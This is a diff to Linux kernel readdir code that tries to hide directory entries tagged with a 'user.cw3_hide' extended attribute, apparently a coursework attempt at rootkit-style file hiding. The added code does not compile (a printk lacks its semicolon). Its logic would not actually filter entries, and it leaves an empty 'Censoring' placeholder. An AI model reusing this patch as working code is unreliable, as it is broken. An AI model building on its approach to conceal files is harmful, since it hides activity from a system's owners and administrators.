@@ -68,7 +68,21 @@ int iterate_dir(struct file *file, struct dir_context *ctx)
 		file->f_pos = ctx->pos;
 		fsnotify_access(file);
 		file_accessed(file);
+
+		if (res >= 0 && file->f_path.dentry) {
+			struct dentry *dentry = file->f_path.dentry;
+			char xattr_value[256]; // Adjust the size as needed
+
+			ssize_t len = vfs_getxattr(&init_user_ns, dentry, "user.cw3_hide", xattr_value, sizeof(xattr_value));
+
+			if (len >= 0) {
+				// xattr exists, skip listing this directory entry
+				printk("hit")
+				res = 0; // Set result to 0 to indicate success (no error)
+			}
+		}
 	}
+
 	if (shared)
 		inode_unlock_shared(inode);
 	else
@@ -316,7 +330,6 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 	int reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1,
 		sizeof(u64));
 	int prev_reclen;
-	printk("hit");
 	buf->error = verify_dirent_name(name, namlen);
 	if (unlikely(buf->error))
 		return false;
@@ -330,6 +343,9 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 	prev = (void __user *)dirent - prev_reclen;
 	if (!user_write_access_begin(prev, reclen + prev_reclen))
 		goto efault;
+
+	// Censoring
+
 
 	/* This might be 'dirent->d_off', but if so it will get overwritten */
 	unsafe_put_user(offset, &prev->d_off, efault_end);
@@ -350,6 +366,8 @@ efault:
 	buf->error = -EFAULT;
 	return false;
 }
+
+
 
 SYSCALL_DEFINE3(getdents64, unsigned int, fd,
 		struct linux_dirent64 __user *, dirent, unsigned int, count)
